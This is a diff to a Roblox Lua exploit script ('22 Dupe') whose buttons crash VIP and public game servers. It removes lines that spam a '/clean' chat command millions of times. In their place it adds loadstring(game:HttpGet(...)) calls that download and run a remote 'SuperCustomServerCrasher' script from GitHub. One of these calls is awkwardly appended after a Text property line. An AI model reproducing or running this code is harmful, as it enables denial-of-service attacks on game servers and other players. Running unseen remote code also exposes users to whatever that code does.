@@ -40,20 +40,15 @@ CrashServer.BorderSizePixel = 2
 CrashServer.Position = UDim2.new(0.0677290186, 0, 0.47268942, 0)
 CrashServer.Size = UDim2.new(0, 95, 0, 50)
 CrashServer.Font = Enum.Font.PermanentMarker
-CrashServer.Text = "Crash VIP Server"
+CrashServer.Text = "Crash VIP Server"loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
 CrashServer.TextColor3 = Color3.fromRGB(255, 255, 255)
 CrashServer.TextSize = 14.000
 CrashServer.MouseButton1Down:connect(function()
 game.StarterGui:SetCore("SendNotification", {Title = "22 Dupe", Text = "Crashing..", Icon = "rbxassetid://505845268", Duration = 60, Button1 = "Okay"})
 wait(0) local A_1 = "Crashing the Server with 22 Dupe.." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
 
-local natass = "/"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
 
-    local Message = (natass.. "clean".." "):rep(10000000)
-
-    for i = 1, 75000 do
-        game.Players:Chat(Message)
-    end
 
     local notifSound = Instance.new("Sound",workspace)
     	notifSound.PlaybackSpeed = 1
@@ -182,14 +177,8 @@ end)
   Crash.TextSize = 14.000
   Crash.MouseButton1Down:connect(function()
   wait(0) local A_1 = "Crashing the Server with 22 Dupe.." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
 
-	local prefixe = "/"
-
-	local Message = (prefixe.. "clean".." "):rep(100000)
-
-	for i = 1, 750 do
-			game.Players:Chat(Message)
-	end
 
     local notifSound = Instance.new("Sound",workspace)
     	notifSound.PlaybackSpeed = 1
